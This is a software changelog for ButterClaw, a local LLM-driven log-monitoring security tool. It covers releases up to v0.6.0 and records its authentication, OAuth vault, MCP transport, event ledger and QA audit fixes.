- **authFetch Wrapping (`routing.html`):** 10 `fetch()` calls wrapped with `authFetch()` — settings load/save, gate save, MCP status/tools/ping/restart, SSE save/restart, ledger fetch.
- **SSE Auth (`index.html`):** `connectSSE()` now uses `connectAuthSSE()` to pass session token as query parameter.
- **Dashboard Init Gating (`index.html`, `routing.html`):** Page init functions now call `checkSession()` first — data loading and SSE connection only proceed if session is valid.
- **Boot Sequence (`server.py`):** `bootstrap_admin_key()` called after `init_db()` and before MCP handshake. Prints admin key to terminal on first run.
- **Version Bumps (`routing.html`):** 5 locations updated — sidebar footer, MCP Armed/Degraded/Offline badges, MCP Info Box. All bumped from v0.5.1 to v0.6.0.
- **Auth Error Handling (`index.html`, `routing.html`):** Every `catch` block after `authFetch()` includes `if (e.message === 'auth_required') return;` to prevent error noise when login modal is shown.
- **Docstring + VERSION (`server.py`):** Updated to `ButterClaw v0.6.0 — The Exoskeleton (API Gateway & Auth)`, `VERSION = "0.6.0"`.
- **Docstring (`buttervault.py`):** Updated to v0.6.0 with `[v0.6.0] The Gibson now hooks into auth.py to destroy API key hashes.`

### Architecture Notes

**Authentication Flow:**
```
Browser → index.html / routing.html
        → checkSession() → GET /api/auth/whoami
        → No valid session → showLoginModal()
        → User enters API key → POST /api/auth/login
        → Server verifies key hash (HMAC-SHA256 + salt)
        → Returns session token (HMAC-signed JSON, 1hr TTL)
        → Token stored in localStorage + httpOnly cookie
        → authFetch() injects Bearer header on all API calls
        → 401/403 → auto-clear session → show login modal
```

**Endpoint Classification:**

| Tier | Endpoints | Who |
|---|---|---|
| Public | `/api/health`, `/api/vault/oauth/callback`, `/api/auth/login`, `/api/auth/logout` | Anyone |
| Viewer | `/api/logs`, `/api/mcp/status`, `/api/mcp/tools`, `/api/mcp/events`, `/api/mcp/events/<id>`, `/api/vault/status`, `/api/vault/oauth/status`, `/api/stream`, `/api/auth/whoami` | Read-only dashboards |
| Operator | `/api/analyze`, `/api/settings` (GET), `/api/mcp/ping`, `/api/vault/oauth/start/<p>` | Active operators |
| Admin | `/api/settings` (POST), `/api/vault/key`, `/api/rotate-keys`, `/api/shield`, `/api/mcp/restart`, `/api/vault/oauth/revoke/<p>`, `/api/auth/keys` (all methods) | System owner |

**Gibson Destruction Scope (v0.6.0):**
```
butter_keys()
├── UPDATE vault SET ciphertext = garbage           ← Static API keys
├── UPDATE oauth_tokens SET ciphertext = garbage    ← OAuth payloads
└── auth.destroy_all_api_keys()                     ← API key hashes + sessions
```

After Gibson: all authentication invalidated. System requires fresh `bootstrap_admin_key()` to re-enter.

**What Does NOT Change:**

| Component | Why |
|---|---|
| Watcher → Server comm | Localhost process-to-process — auth adds latency for zero gain |
| stdio MCP transport | Child process, same machine |
| SSE MCP transport auth | MCP-spec OAuth 2.1 territory — v0.7+ concern |
| `butterclaw_mcp.py` | Execution layer, auth-unaware by design |
| `mcp_transport.py` | Transport is auth-agnostic |
| `oauth_config.py` | Static registry — stays pristine |

**Security Design:**

| Decision | Rationale |
|---|---|
| HMAC-SHA256 with per-key salt | Prevents rainbow table attacks |
| Constant-time comparison | `hmac.compare_digest()` prevents timing side-channels |
| 0.1s delay on failed login | Prevents brute-force enumeration |
| Session key derived from Vault master | Gibson destruction invalidates all sessions |
| httpOnly + SameSite=Strict cookies | Prevents XSS and CSRF |
| Self-revocation blocked | Can't revoke your own admin key (prevents lockout) |
| Privilege escalation blocked | Operators can't create admin keys |
| Plaintext shown once | `create_api_key()` returns raw key exactly once |

**New Dependencies:** None. Zero new pip packages.

**New Files:** 1 (`auth.py`)

**New SQLite Tables:** 1 (`api_keys`)

**New API Endpoints:** 7

---

## [0.5.2] - ButterVault OAuth (Credential Lifecycle Management) - 2026-04-16

### Added
- **OAuth Token Storage (`buttervault.py`):** The ButterVault now encrypts and stores structured OAuth token payloads (access token, refresh token, expiry timestamp, token type, scope) as JSON blobs using the same Fernet + OS keyring encryption pipeline trusted for static API keys. New functions: `store_oauth_token()`, `get_oauth_token()`, `delete_oauth_token()`, `list_oauth_providers()`.
- **New SQLite Table (`buttervault.py`):** `oauth_tokens` table with `provider`, `ciphertext`, `created_at`, and `last_refresh` columns. Separate from the `vault` table — same encryption, clean schema separation.
- **Automatic Token Refresh (`buttervault.py`):** `refresh_token_if_needed()` checks token expiry with a 60-second safety buffer, silently refreshes via the provider's token endpoint using the stored refresh token, re-encrypts the new tokens, and updates the Vault. Handles rotating refresh tokens (updates if provider issues a new one). Returns the refreshed token dict or `None` on failure.
- **OAuth Authorization Flow (`server.py`):** Full OAuth 2.0 authorization code flow with four new endpoints:
  - `GET /api/vault/oauth/start/<provider>` — Generates a CSRF-protected authorization URL using `secrets.token_urlsafe(32)`. Client credentials (`client_id`, `client_secret`) are read from the ButterVault, never hardcoded. Google-specific parameters (`access_type=offline`, `prompt=consent`) ensure refresh token acquisition.
  - `GET /api/vault/oauth/callback` — Validates CSRF state (single-use, 10-minute TTL), exchanges the authorization code for tokens via POST to the provider's token endpoint, assembles a structured token dict with computed `expires_at`, and seals it in the ButterVault. Logs a successful connection to the oopsie log (emerald/🔑).
  - `GET /api/vault/oauth/status` — Returns connection status for all OAuth-capable providers: `connected`, `has_refresh_token`, `expires_at`, `expired`, and `has_client_credentials` flags.
  - `POST /api/vault/oauth/revoke/<provider>` — Best-effort remote token revocation at the provider's `revoke_url`, then unconditional local deletion from the Vault regardless of remote result.
- **CSRF State Management (`server.py`):** Thread-safe in-memory state store (`_oauth_states`) with `threading.Lock`, 10-minute TTL, and automatic cleanup of expired tokens on every new flow initiation.
- **OAuth Result Page (`server.py`):** `_oauth_result_page()` helper returns a self-closing HTML popup with success/error styling, `postMessage` to the opener window for cross-window communication, and 2-second auto-close.
- **Vault Diagnostic Mode (`buttervault.py`):** Extended the `if __name__ == "__main__"` test suite with OAuth token store/retrieve and Gibson destruction verification for OAuth payloads.

### Changed
- **Gibson Kill Switch (`buttervault.py`):** `butter_keys()` now destroys **both** the `vault` table (static API keys) AND the `oauth_tokens` table (OAuth payloads) in a single atomic operation. Both global and provider-scoped destruction hit both tables. The Sovereign Seal holds — OAuth tokens are mathematically annihilated alongside static keys.
- **Client Credential Architecture (`server.py`):** OAuth client credentials (`client_id`, `client_secret`) are stored in the ButterVault via the existing `/api/vault/key` endpoint using provider-namespaced keys (e.g., `google_client_id`, `google_client_secret`). The OAuth start endpoint reads them from the Vault at flow initiation time. If the Vault is Buttered, the OAuth flow cannot start — correct behavior.
- **New Imports (`server.py`):** Added `import secrets` (CSRF token generation), `from urllib.parse import quote` (URL encoding without `requests.utils` dependency), and `import oauth_config` (provider registry access).
- **Version Strings:** All files updated to `v0.5.2`.

### Fixed
- **Orphaned Ledger Entry (`server.py`):** Fixed a bug in `ChainExecutor.execute()` where the exception handler called `ledger_log_start()` but never called `ledger_log_end()`, leaving a permanent `pending` row in the `mcp_events` table for any chain step that threw an exception. Now captures the `event_id` and closes the entry as `status="error"` with the exception message.

### Architecture Notes

**OAuth Token Lifecycle:**
```
User clicks "Connect" → Frontend calls /api/vault/oauth/start/google
                         → Server reads client_id from Vault
                         → Server generates CSRF state token
                         → Server returns authorization URL
                         → Frontend opens popup to Google
                         → User authorizes
                         → Google redirects to /api/vault/oauth/callback
                         → Server validates CSRF state
                         → Server exchanges code for tokens
                         → Server seals tokens in ButterVault
                         → Popup closes, signals parent via postMessage
```

**Token Refresh Flow:**
```
Any tool needs OAuth token → refresh_token_if_needed(provider, ...)
                            → Decrypt token from Vault
                            → Check: time.time() < (expires_at - 60)?
                            → Yes: return token (still valid)
                            → No: POST refresh_token to provider
                            → Re-encrypt new tokens in Vault
                            → Return refreshed token
```

**Gibson Destruction Scope (v0.5.2):**
```
butter_keys()
├── UPDATE vault SET ciphertext = garbage        ← Static API keys
└── UPDATE oauth_tokens SET ciphertext = garbage ← OAuth payloads
```

**OAuth-Capable Providers (from oauth_config.py):**

| Provider | Auth Method | OAuth Status |
|---|---|---|
| Anthropic (Claude) | API key only | ❌ No public OAuth |
| OpenRouter | API key only | ❌ No public OAuth |
| Google Cloud (Gemini) | OAuth 2.0 | ✅ Endpoints configured |
| GitHub | OAuth 2.0 | ✅ Endpoints configured |

**New Dependencies:** None. Token exchange uses existing `requests` library. CSRF uses stdlib `secrets`.

**New Files:** None. `oauth_config.py` was created in v0.5.0 — unchanged in v0.5.2 (static registry, no behavioral code added).

**New SQLite Tables:** 1 (`oauth_tokens`)

**New API Endpoints:** 4 (`/start`, `/callback`, `/status`, `/revoke`)

---

## [0.5.1] - Tool Chaining (Multi-Step Execution) - 2026-04-16

### Added
- **ChainExecutor (`server.py`):** New engine allowing the Brain to compose and execute sequential, multi-step MCP tool chains for custom threat response strategies.
- **Condition Evaluator (`server.py`):** Added conditional logic between chain steps using a safe, whitelist-based operator dictionary (`contains`, `not_contains`, `equals`, `not_equals`, `starts_with`). Explicitly avoids arbitrary code execution/`eval()`. Operator logic is case-insensitive and stripped of whitespace.
- **Event Ledger Chain Grouping (`routing.html`):** The ledger UI now visually groups related chain events together by their `chain_id`. Chain blocks feature a consolidated header with a step count, aggregated status icons, and individual step-number badges for each tool execution.
- **Oopsie Card Chain Links (`index.html`):** CRITICAL alerts triggered by a multi-step chain now dynamically render a violet "Multi-Step Chain" badge in the UI action field, alongside a "View in Ledger →" link to trace the execution path.
- **Dynamic Brain Prompting (`server.py`):** The LLM system prompt now dynamically builds the available MCP `tools_context` from the handshake and includes the optional `"chain"` array JSON schema instructions.
- **Safety Rails (`server.py`):** Enforced a hard limit of `MAX_STEPS = 10` and a cumulative total `TIMEOUT = 60` seconds for all chain executions to prevent infinite reasoning loops or stalling.

### Changed
- **CRITICAL Path Routing (`server.py`):** The `analyze_threat` function now intercepts the `"chain"` field from the Brain's output and routes to `ChainExecutor`. If no chain is present, it safely falls back to the legacy hardcoded tool sequence (backward compatible).
- **Vault Integrity Guarantee (`server.py`):** Ensured `buttervault.butter_keys()` is ALWAYS executed locally during a CRITICAL verdict, independently of whether the Brain included `rotate_keys` in its MCP chain contents.
- **Event Ledger Integration (`server.py`):** Tool calls invoked via the `ChainExecutor` now actively populate the `chain_id` and `chain_step` columns in the `mcp_events` SQLite table, linking step sequences together.
- **Step Enumeration (`server.py`):** Improved LLM token efficiency by removing the requirement for the Brain to output specific step numbers, instead deriving `chain_step` dynamically using Python's `enumerate()`.
- **UI State & Copy (`routing.html`, `index.html`):** Version footers bumped to v0.5.1, the MCP Info Box updated to document conditional chaining, and the `ledgerStatusColors` dictionary expanded to support the new `skipped` (violet) step status.

### Fixed
- **Tools List Iteration (`server.py`):** Fixed an `AttributeError` crash during prompt generation by correctly iterating over the `mcp_manager.discovered_tools` list instead of calling `.items()` on it.

---

# Changelog: ButterClaw v0.5.0
Release Date: April 13, 2026

## [0.5.0] - The Nervous System (Event Ledger + SSE Transport)

### Added
- **MCP Event Ledger (`server.py`):** Persistent, append-only audit log of every MCP tool invocation. New `mcp_events` SQLite table tracks timestamp, JSON-RPC id, method, tool name, arguments, status (pending/success/error/timeout), result (truncated to 4KB), elapsed time in ms, trigger source (auto/manual/critical/handshake/ping), and chain metadata (chain_id, chain_step) for future v0.5.1 tool chaining. Every `send()` call in both `MCPProcessManager` and `MCPSSEClient` writes a `pending` row before dispatch, then updates it with the outcome after response/timeout/error.
- **Event Ledger API Endpoints (`server.py`):**
  - `GET /api/mcp/events` — Query the ledger with optional filters: `?limit=`, `?tool=`, `?status=`, `?since=`. Returns events array, count, and total.
  - `GET /api/mcp/events/<id>` — Fetch a single event with full result payload.
- **Event Ledger UI Panel (`routing.html`):** New "Event Ledger" section below the MCP panel with a cyan/teal gradient header. Features:
  - Filterable by tool name and status via dropdown selectors
  - Each event row shows tool name, status dot (color-coded), elapsed ms, timestamp, and event ID
  - Collapsible result preview — click "Show result" to expand the JSON response inline
  - Arguments displayed as a truncated mono line
  - Trigger source and chain metadata shown for non-auto events
  - Auto-refreshes every 30s alongside MCP status polling
  - Manual refresh button
- **Event Ledger Nav Link (`index.html`):** New sidebar navigation entry "Event Ledger" linking to `routing.html#eventLedgerSection`.
- **Temporal Memory Injection (`server.py`):** Cured "LLM amnesia" by patching `ask_guardian_agent()` to query the new `mcp_events` ledger before evaluating a log. The Brain now receives a sliding window of recent tool executions (temporal context) to detect behavioral drift over time rather than evaluating isolated snapshots.
- **Stateless Self-Reflection / The Auditor (`server.py`):** `run_self_audit()` background daemon fires 30 seconds after any CRITICAL verdict. Uses the same Gemma 4 model at `temperature: 0.0` to review the sanitized event ledger and flag potential false positives without giving the AI authority to lower its own shields.
- **Dynamic Dual-Persona Prompting (`server.py`):** Embedded complex JSON schemas and dual-persona instructions (The Instinct vs. The Auditor) directly into the Flask API request payloads. This guarantees 100% plug-and-play portability for users cloning the repo and running vanilla `gemma4:e4b`, eliminating the strict requirement for a custom compiled `Modelfile`.
- **Transport Abstraction Layer (`mcp_transport.py` — NEW FILE):** Decouples MCP I/O from protocol logic. Two transport implementations behind a common `BaseTransport` interface (`read()`, `write()`, `start()`, `stop()`):
  - `StdioTransport` — Wraps stdin/stdout. Extracts the I/O loop that was previously inline in `butterclaw_mcp.py`'s `main()`.
  - `SSETransport` — Runs a threaded HTTP server using stdlib `http.server` (zero new pip dependencies). `GET /sse` opens a Server-Sent Events stream, `POST /message` receives JSON-RPC requests. Supports optional bearer token authentication. Sends 30s keepalive comments to prevent connection timeout. First SSE event is `event: endpoint` telling the client where to POST (MCP SSE spec compliant).
  - `create_transport()` factory function for CLI flag → transport instance creation.
- **SSE Transport CLI Flags (`butterclaw_mcp.py`):** New argparse flags:
  - `--transport stdio|sse` — Select transport mode (default: stdio)
  - `--bind HOST` — Bind address for SSE (default: 127.0.0.1)
  - `--port PORT` — Port for SSE (default: 5001)
  - `--token SECRET` — Bearer token for SSE auth. Required when binding to 0.0.0.0.
  - Safety: binding to 0.0.0.0 without --token is rejected at startup.
- **MCPSSEClient (`server.py` — NEW CLASS):** Connects to a remote MCP server running SSE transport. Same interface as `MCPProcessManager` (`BaseMCPManager`):
  - `send()` POSTs JSON-RPC to `/message`, waits for correlated response on the SSE stream
  - `_read_sse_stream()` background thread parses SSE events, handles endpoint discovery, message correlation, and automatic reconnection (5s backoff)
  - Health check via `GET /health` on startup
  - Auth via `Authorization: Bearer <token>` header on all requests
  - Ledger integration: every `send()` logs to the event ledger identically to stdio manager
- **BaseMCPManager Interface (`server.py`):** Abstract base class defining the common interface for both `MCPProcessManager` and `MCPSSEClient`. Both implement `send()`, `notify()`, `handshake()`, `status()`, `start()`, `stop()`, `restart()`, `is_alive`, and `transport_name`.
- **MCP Manager Factory (`server.py`):** `create_mcp_manager()` reads `mcp_transport_mode` and `mcp_sse_url` from config to instantiate the correct manager. `mcp_restart` endpoint detects transport mode changes and swaps the manager instance.
- **Transport Selector UI (`routing.html`):** New toggle in the MCP panel — stdio vs SSE buttons with violet highlight. Selecting SSE reveals a config panel with URL input, token input, and "Save SSE Config & Restart MCP" button. Saves to `/api/settings` then triggers `/api/mcp/restart`.
- **MCP Transport Settings (`server.py`):** Three new config fields exposed via `/api/settings`:
  - `mcp_transport` — "stdio" or "sse"
  - `mcp_sse_url` — Remote MCP server URL
  - `mcp_sse_token_set` — Boolean (token existence, never exposes the actual token)
- **OAuth Provider Registry (`oauth_config.py` — NEW FILE):** Skeleton configuration mapping provider names to OAuth endpoints, scopes, and metadata. Four providers registered:
  - Anthropic (Claude) — api_key only (no public OAuth as of April 2026)
  - OpenRouter — api_key only
  - Google Cloud (Gemini) — OAuth 2.0 supported, endpoints configured
  - GitHub — OAuth 2.0 supported, endpoints configured
  - Helper functions: `get_provider()`, `list_providers()`, `list_oauth_capable()`, `list_api_key_only()`, `get_auth_method()`

### Changed
- **`butterclaw_mcp.py` Main Loop:** Refactored from raw `sys.stdin.readline()` / `sys.stdout.write()` to `transport.read()` / `transport.write()`. Protocol handler (`ButterClawMCPServer.route()`) was already transport-agnostic — only the I/O layer changed. Added `KeyboardInterrupt` handler and `finally` block for clean transport shutdown.
- **`server.py` Import Alias:** `import requests` renamed to `import requests as http_requests` to avoid collision with Flask's `request` object now that both are used in the SSE client.
- **`/api/mcp/status` Response:** Now includes `transport_mode` ("stdio" or "sse"), `event_count` (total ledger entries), and `remote_url` (for SSE clients).
- **`/api/mcp/restart` Endpoint:** Detects if the transport mode changed since the current manager was created. If so, stops the old manager and creates a new one via the factory before restarting.
- **`/api/mcp/ping` Endpoint:** Now passes `trigger="ping"` to `send()`, so pings are recorded in the event ledger.
- **`/api/settings` GET Response:** Now includes `mcp_transport`, `mcp_sse_url`, and `mcp_sse_token_set`.
- **Version Strings:** All files updated to `v0.5.0` — `server.py`, `butterclaw_mcp.py`, `routing.html` footer/badges, `index.html` comments.
- **MCP Info Box Text (`routing.html`):** Updated description to mention dual transport and event ledger.

### Architecture Notes

**Transport Abstraction:**
```
ButterClawMCPServer.route(request) → response
          ↑                    ↓
  transport.read()     transport.write()
          ↑                    ↓
     ┌────┴────┐          ┌────┴────┐
     │  stdio  │          │   SSE   │
     │ (local) │          │(network)│
     └─────────┘          └─────────┘
```

**Event Ledger Schema:**
```sql
CREATE TABLE mcp_events (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp   TEXT NOT NULL,         -- ISO 8601 UTC
    req_id      INTEGER,               -- JSON-RPC id
    method      TEXT NOT NULL,         -- e.g. "tools/call"
    tool_name   TEXT,                  -- e.g. "execute_gibson_kill"
    arguments   TEXT,                  -- JSON string of input args
    status      TEXT NOT NULL,         -- pending | success | error | timeout
    result      TEXT,                  -- JSON string (truncated to 4KB)
    elapsed_ms  REAL,                  -- round-trip time
    trigger     TEXT DEFAULT 'auto',   -- auto | manual | critical | handshake | ping
    chain_id    TEXT,                  -- groups steps in a chain (v0.5.1)
    chain_step  INTEGER               -- step number within chain (v0.5.1)
);
```

**Dual Manager Architecture:**
```
server.py
│
├── mcp_manager = create_mcp_manager()
│   │
│   ├── MCPProcessManager (stdio) ← local child process
│   │   ├── stdin writer
│   │   ├── stdout reader thread
│   │   ├── stderr drain thread
│   │   └── ledger hooks in send()
│   │
│   └── MCPSSEClient (sse) ← remote HTTP
│       ├── POST /message sender
│       ├── SSE stream reader thread
│       ├── auto-reconnect (5s backoff)
│       └── ledger hooks in send()
│
└── Both implement BaseMCPManager interface
```

**New Dependencies:** None. SSE transport uses stdlib `http.server` and `threading`. SSE client uses existing `requests` library.

**New Files:**
- `mcp_transport.py` — Transport abstraction layer (~250 lines)
- `oauth_config.py` — OAuth provider registry skeleton (~100 lines)

---

### 📦 v0.4.1 Complete Delivery Recap

| File | Status | Key Fixes |
|---|---|---|
| **`routing.html`** | ✅ Delivered | R1 🔴 CSP comment removed; R2 🟡 dynamic protocol version; R3 🟡 auto-refresh on armed transition |
| **`server.py`** | ✅ Delivered | S1 🔴 auto-restart chains handshake; S2–S5 🟡 thread safety, TOCTOU, MCP truth-telling, module-level threshold |
| **`butterclaw_mcp.py`** | ✅ Delivered | M1 🟡 error correlation; M2 🟡 arg validation; M3 🟢 basicConfig documented; M4 🟢 pre-init guard |
| **`index.html`** | ✅ Delivered | Clean — version alignment only |
| **`CHANGELOG.md`** | ✅ Delivered | Full v0.4.1 QA audit entry with all 15 findings |

### Patched — v0.4.0 QA Audit for v0.4.1

Audit Date: April 11, 2026
Scope: Full codebase review of v0.4.0 release — 4 files audited
Findings: 15 total — 2 🔴 Bugs, 7 🟡 Issues, 6 🟢 Notes

#### `routing.html` — 3 patches (R1, R2, R3)

| ID | Severity | Finding | Fix |
|----|----------|---------|-----|
| R1 | 🔴 Bug | HTML comment placed **inside** the CSP `content` attribute. Browsers parse `<!--` as literal CSP text, not as a comment — likely breaking the `img-src 'self' data:` directive that follows. **Introduced by the v0.3.2 B1 patch itself.** | Removed the comment from inside the attribute. Audit trail preserved as a normal HTML comment above the `<meta>` tag. |
| R2 | 🟡 Issue | Protocol version `"2024-11-05"` hardcoded in a static `<div>` in the MCP info grid. If `butterclaw_mcp.py` updates its `protocolVersion`, the UI shows stale info. | Changed to dynamic: `mcpProtocolVersion` div populated from `/api/mcp/status` response. |
| R3 | 🟡 Issue | `mcpFetchTools()` runs once at page load and on manual Refresh click — not on a periodic interval. When the server transitions from offline → online, the tool list stays empty until manual refresh. | Added `_prevMcpArmed` state tracking. `mcpCheckStatus()` now calls `mcpFetchTools()` automatically when state transitions from non-armed → armed. |

#### `server.py` — 5 patches (S1, S2, S3, S4, S5)

| ID | Severity | Finding | Fix |
|----|----------|---------|-----|
| S1 | 🔴 Bug | **`send()` auto-restart skips handshake.** When `send()` detects a dead child, it calls `self.start()` but **not** `self.handshake()`. After auto-restart: `handshake_ok` stays `False`, `discovered_tools` is empty/stale. | Added `self.handshake()` after `self.start()` in the auto-restart block inside `send()`. |
| S2 | 🟡 Issue | `_req_counter += 1` is not atomic. Two concurrent Flask threads calling `send()` could receive the same `req_id`. | Replaced with `itertools.count(1)` — thread-safe in CPython without requiring a lock. |
| S3 | 🟡 Issue | `status()` has a TOCTOU race on `self.process`. Between the truthiness check and `.pid` access, another thread could call `stop()` and set `self.process = None`. | Snapshot the reference: `proc = self.process` at the top of `status()`, use `proc` throughout. |
| S4 | 🟡 Issue | **CRITICAL verdict path ignores MCP `send()` return values.** If the MCP child is dead or calls timeout, `action` still reports `"SIGKILL \| Keys Buttered"`. | Capture return values. Check for `"error"` key. Append failure details to the action string. |
| S5 | 🟡 Issue | `CONFIDENCE_THRESHOLD = 85` defined as a local variable inside `analyze_threat()`, but the boot banner hardcodes `85` separately. | Extracted `CONFIDENCE_THRESHOLD` to module-level constant. Both references linked. |

#### `butterclaw_mcp.py` — 4 patches (M1, M2, M3, M4)

| ID | Severity | Finding | Fix |
|----|----------|---------|-----|
| M1 | 🟡 Issue | General exception handler sends `"id": None` in error response even though the parsed request dict may be in scope. Parent can't correlate → falls through as "Orphaned response" → parent times out. | Track `last_request` after successful JSON parse. General `except Exception` block now sends `"id": last_request.get("id")`. |
| M2 | 🟡 Issue | `handle_tools_call` passes `**tool_args` directly to tool functions with no schema validation. | Built `_TOOL_ALLOWED_ARGS` lookup from `inputSchema.properties` at module load. Intersects incoming keys against allowed keys. |
| M3 | 🟢 Note | `logging.basicConfig()` is at module level — flagged previously but architecturally correct since this file runs as a standalone subprocess. | Added architectural comment documenting the justification. |
| M4 | 🟢 Note | `initialized` flag is set in `handle_initialize` but never checked — `tools/call` doesn't gate on whether `initialize` was called first. | Added `if not self.initialized` guard in `handle_tools_call` returning `-32002` (Server not initialized). |

#### `index.html` — Clean (version alignment only)

| ID | Severity | Finding | Fix |
|----|----------|---------|-----|
| — | 🟢 Clean | No issues found. CSP is tight, all dynamic content uses `textContent` and `createElement`. | Version comments updated from v0.4.0 → v0.4.1 for alignment. |

#### Cross-File Audit Notes — 🟢 Positive

| # | Scope | Finding |
|---|-------|---------|
| N1 | `index.html`, `routing.html` | XSS safety maintained — all new MCP panel code uses `textContent` and `createElement`. No `innerHTML` with server data. |
| N2 | `index.html`, `routing.html` | MCP badge visual states are consistent — both pages use the same three-state model (Armed / Degraded / Offline). |
| N3 | `server.py` | ButterVault remains a direct local call — `buttervault.butter_keys()` in the CRITICAL path is not routed through MCP. |
| N4 | `server.py` | Reader thread shutdown is clean — `stop()` properly wakes all waiting threads via `event.set()` before clearing `_pending`. No zombie threads. |
| N5 | `butterclaw_mcp.py` | `notify()` is spec-correct — omits `"id"` from the JSON-RPC payload, producing a valid notification per JSON-RPC 2.0. |
| N6 | `server.py` | stderr drain solved — `_read_stderr` runs as a daemon thread, continuously draining and logging child stderr. |

---

# Changelog: ButterClaw v0.4.0
Release Date: April 9, 2026

## [0.4.0] - The Claws Awaken (MCP Transport & Observability)

### Added
- **Full MCP Protocol Compliance (`butterclaw_mcp.py`):** The execution layer now speaks real Model Context Protocol over stdio. `initialize` returns `protocolVersion` (`2024-11-05`), `serverInfo`, and proper `capabilities` shape. Added `tools/list`, `ping`, and `notifications/initialized` handlers. Tool results now return MCP-standard content arrays (`{content: [{type: "text", text: "..."}], isError: bool}`).
- **Threaded MCP Process Manager (`server.py`):** Replaced the inline blocking `stdout.readline()` with a dedicated `MCPProcessManager` class. Stdout and stderr each get their own daemon reader thread — Flask never blocks on MCP I/O, and the child process never deadlocks from a full stderr pipe.
- **Response Correlation by ID:** MCP requests are tracked via a `_pending` dictionary keyed by JSON-RPC `id`. The stdout reader thread wakes the correct waiting sender via `threading.Event`.
- **Configurable Timeouts:** Every `MCPProcessManager.send()` call accepts a `timeout` parameter (default 10s).
- **Auto-Restart:** If `send()` detects a dead child process, it automatically respawns and re-runs the handshake before retrying.
- **3-Step MCP Handshake (`server.py`):** initialize → notifications/initialized → tools/list.
- **4 New API Endpoints (`server.py`):** `/api/mcp/status`, `/api/mcp/ping`, `/api/mcp/tools`, `/api/mcp/restart`.
- **Expanded Tool Registry (`butterclaw_mcp.py`):** 5 tools (up from 2): `execute_gibson_kill`, `rotate_keys`, `system_status`, `scan_port`, `log_event`.
- **MCP Sidebar Badge (`index.html`):** New status indicator showing MCP state (Armed / Degraded / Offline).
- **Live MCP Panel (`routing.html`):** Process status, ping, restart, and dynamic tool list with `inputSchema` inspection.

### Changed
- **Dispatch Table Architecture (`butterclaw_mcp.py`):** Replaced `if/elif` routing with `METHOD_MAP` and `TOOL_DISPATCH` dicts.
- **Tool Schema Field Name:** Now uses `inputSchema` (MCP standard) instead of `parameters`.
- **JSON-RPC Error Codes:** Proper codes throughout — `-32700`, `-32601`, `-32602`, `-32603`.
- **MCP Commands in Analyze Path (`server.py`):** CRITICAL responses now push through `MCPProcessManager` (non-blocking, correlated).
- **Version Strings:** All files updated to `v0.4.0`.

### Fixed
- **Flask Thread Blocking:** Eliminated inline `stdout.readline()` on Flask request threads.
- **Child Deadlock Risk:** stderr now drained continuously by dedicated thread.
- **Orphaned Response Handling:** Unknown response IDs logged with warning instead of silently dropped.
- **Handshake Failure Visibility:** Failed handshake now sets `handshake_ok = False` for truthful status reporting.

---

### Patched — v0.3.1 QA Audit for v0.3.2

Audit Date: April 5, 2026
Scope: Full codebase review of v0.3.1 release — 5 files audited
Findings: 13 total — 5 🔴 Bugs, 8 🟡 Issues, 6 🟢 Notes

*(See v0.3.2 patch notes in CHANGELOG v0.4.0 section above for full audit details.)*

---

# Changelog: ButterClaw v0.3.1
Release Date: April 4, 2026

## [0.3.1] - Reasoning Engine (Self-DoS & Stability Patch)

### Added
- **Self-DoS Prevention:** `CONFIDENCE_THRESHOLD` (85%) prevents weak CRITICAL verdicts from triggering the Gibson.

### Fixed
- **LLM Hallucination Handling:** Confidence formatting correction and clamping to [0.0, 1.0].
- **Execution Hot-Paths:** Module imports moved to top-level scope.

---

# Changelog: ButterClaw v0.3
Release Date: April 4, 2026

## [0.3.0] - The ButterVault & MCP Scaffold

### Added
- **The ButterVault (`buttervault.py`):** AES-encrypted API key storage via OS-native `keyring`.
- **Live Ammunition:** Gibson Kill Switch physically overwrites Vault ciphertexts.
- **True MCP Scaffolding:** `ButterClawMCPServer` with JSON-RPC tool schemas.
- **Hardware Profiles:** `Modelfile.example` for tuned local GPU inference.

### Changed
- **Brain Upgrade:** Pivoted from `phi3` to `gemma4:e4b`.
- **Context Expansion:** Watcher log truncation limit increased from 500 to 4096 characters.

---

## [0.2.1] — The Mind Reader Update - 2026-03-xx

### Added
- **Logic Gate Trace:** `primary_gate` field forcing the Brain to identify the analytical vector.
- **UI Mind Reader Window:** Displays triggering logic gate next to confidence score.

### Changed
- **Terminology Pivot:** "Deterministic" → "Probabilistic".

---

## [0.2.0] — The Kinetic Update - 2026-03-xx

### Added
- **The Claws (`butterclaw_mcp.py`):** MCP execution layer for OS-level interventions.
- **Gibson Kill Switch:** Dry Run safety harness for simulated SIGKILL and key rotation.
- **Structured JSON Intelligence:** Strict JSON schema output.
- **Confidence Scoring:** Probabilistic confidence score (0.0 - 1.0).

### Changed
- **The Brain:** Transitioned from passive "judge" to active "Sentinel".

### Fixed
- **The Box Trap:** Non-deterministic text outputs no longer crash the parser.

---

## [0.1.1] — Security & Routing Update - 2026-03-23

52 patches across 4 files. Zero new dependencies.

---

## [0.1.0] — Initial Prototype Release — 2026-03-17

- Prototype dashboard (`index.html`)
- Flask API server (`server.py`)
- Log watcher daemon (`watcher.py`)
- Ollama + Phi-3 local inference
- SQLite short-term memory
- SSE log streaming
